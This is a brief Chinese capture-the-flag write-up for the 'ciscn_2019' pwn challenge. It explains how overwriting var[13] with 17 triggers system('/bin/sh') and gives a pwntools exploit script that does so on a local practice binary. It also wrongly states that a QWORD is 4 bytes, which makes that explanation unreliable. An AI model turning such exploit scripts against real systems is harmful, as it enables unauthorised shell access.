执行一下的效果

![image-20201102171957552](https://static.hack1s.fun/images/2021/02/06/image-20201102171957552.png)

是一个输入名字的程序

安全机制基本都开了

![image-20201102172023608](https://static.hack1s.fun/images/2021/02/06/image-20201102172023608.png)

查看main函数，可以看到进行了一个判断，如果打到了这个点就会执行bin/sh

![image-20201102172124594](https://static.hack1s.fun/images/2021/02/06/image-20201102172124594.png)

但是我们输入`aaa`显然连那个大的判断if都没有进入

这里观察一下其实就是让输入的`var[13]`不为0

Var的长度超过14就可以，而调用了system的那个小if则是判断`var[13]`是否等于17

只是要注意这里var是当作QWORD读的

QWORD是4个字节，也就是说13*4+1的位置要是17

```python
from pwn import *
io = process('./ciscn_2019')
io.recvuntil('?\n')

payload = 'a'*13*4+p64(17)
io.sendline(payload)
io.interactive()
```

